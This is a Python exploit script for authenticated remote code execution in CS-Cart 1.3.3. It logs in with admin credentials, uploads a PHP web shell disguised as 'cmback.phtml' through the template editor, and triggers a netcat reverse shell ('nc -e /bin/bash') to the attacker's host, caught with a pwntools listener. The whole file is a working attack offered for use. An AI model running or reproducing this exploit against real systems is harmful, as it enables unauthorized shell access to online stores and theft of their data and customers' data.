#!/usr/bin/env python3

import re
import sys
import requests
import argparse
import threading
from time import sleep
from pwn import listen

parser = argparse.ArgumentParser(description="--- Authenticated CS-Cart 1.3.3 RCE ---")
parser.add_argument('-u', '--url', help='URL to CS Cart.')
parser.add_argument('-U', '--user', help='Admin username.')
parser.add_argument('-P', '--pwd', help='Admin password.')
parser.add_argument('-l', '--lhost', help='Local host for the reverse shell.')
parser.add_argument('-p', '--lport', help='Local port for the reverse shell.')

args = parser.parse_args()
url = args.url
user = args.user
password = args.pwd
lhost = args.lhost
lport = args.lport

class Exploit:
    def __init__(self):
        self.url = url
        self.user = user
        self.pwd = password
        self.lhost = lhost
        self.lport = lport
        self.rev = f'<?php system("nc -e /bin/bash {lhost} {lport}"); ?>'
        self.BLUE = '\033[94m'
        self.GREEN = '\033[32m'
        self.RED = '\033[31m'
        self.END = '\033[0m'
        self.s = requests.Session()
        print(f"{self.BLUE}[*]{self.END} Checking URL ...") 
        sleep(0.5)
        try:
            req = self.s.get(self.url + '/index.php')
            if req.status_code == 200:
                pass
            else:
                print(f"{self.RED}[!]{self.END} Could not connect ... Exiting.")
                sleep(0.5)
                sys.exit(1)
            version = self.s.get(self.url + '/?version')
            print(f"{self.BLUE}[*]{self.END} Checking CS-Cart version ...")
            sleep(0.5)
            if "1.3.3" in version.text:
                print(f"{self.GREEN}[+]{self.END} VULNERABLE CS-Cart version: 1.3.3")
                sleep(0.5)
            else:
                print(f"{self.RED}[!]{self.END} Might be not a vulnarable version!.")
                sleep(0.5)
                sys.exit(1)
        except:
            print(f"{self.RED}[!]{self.END} Oops something wrong!.")
            sleep(0.5)
            sys.exit(1)
    
    # Grab ascid: <input type="hidden" name="acsid" value="2c59a00d7a45285f0bfd372257b0c6d0">
    def grab_acsid(self, target):
        try:
            req = self.s.get(target)
            acsid = re.search(r'<input type="hidden" name="acsid" value="(.*)">', str(req.text)).group(1)
            print(f"{self.BLUE}[*]{self.END} Grabbing acsid token for authentication: {acsid}")
            sleep(0.5)
            return acsid
        except:
            raise
            print(f"{self.RED}[!]{self.END} Something wrong when grabbing acsid.")
            sleep(0.5)
            sys.exit(1)

    def authenticate(self, target, token, username, password):
        #Request
        #target=auth&mode=login&acsid=2c59a00d7a45285f0bfd372257b0c6d0&redirect_url=admin.php&user_login=admin&password=admin
        data = {
            'target':'auth',
            'mode':'login',
            'acsid':token,
            'redirect_url':'admin.php',
            'user_login': username,
            'password':password
                }
        try:
            req = self.s.post(target, data=data)
            if "invalid" in req.text:
                print(f"{self.RED}[!]{self.END} Invalid credentials.")
                sleep(0.5)
                sys.exit(0)
            else:
                print(f"{self.GREEN}[+]{self.END} Successfully logged in.")
        except:
            print(f"{self.RED}[!]{self.END} Error when trying to authenticate admin user.")
            sys.exit(1)

    def upload(self, target, payload):
        files = {
            'target':(None, 'template_editor'),
            'mode':(None, 'upload_file'),
            'm_utype[0]':(None, 'local'),
            'local_uploaded_data[0]':('cmback.phtml', payload, 'application/octet-stream'),
            'server_uploaded_data[0]':(None, None),
            'url_uploaded_data[0]':(None, 'http://')
                }
        print(f"{self.BLUE}[*]{self.END} Trying to upload shell...")
        sleep(0.5)
        try:    
            self.s.post(target, files=files)
        except:
            print(f"{self.RED}[!]{self.END} Error when uploading shell...")
            sys.exit(1)

    def netcat(self):
        nc = listen(self.lport)
        nc.wait_for_connection()
        nc.interactive()

    def call_shell(self, url, function):
        print(f"{self.BLUE}[*]{self.END} Triggering the shell and start netcat listener.")
        sleep(0.5)
        nc = threading.Thread(target=function)
        nc.start()
        self.s.get(url)
        
        
    def main(self):
        auth_url = self.url + '/admin'
        upload_url = self.url + '/admin.php?target=template_editor'
        rev_url = self.url + '/skins/cmback.phtml'

        acsid = self.grab_acsid(auth_url)
        self.authenticate(auth_url, acsid, self.user, self.pwd)
        self.upload(upload_url, self.rev)
        self.call_shell(rev_url, self.netcat)

if __name__ == '__main__':
    if len(sys.argv) < 6:
        print(f"{self.BLUE}[*]{self.END} Usage: python3 cs-cart.py --url http://127.0.0.1\n")
    else:
        Exploit().main()
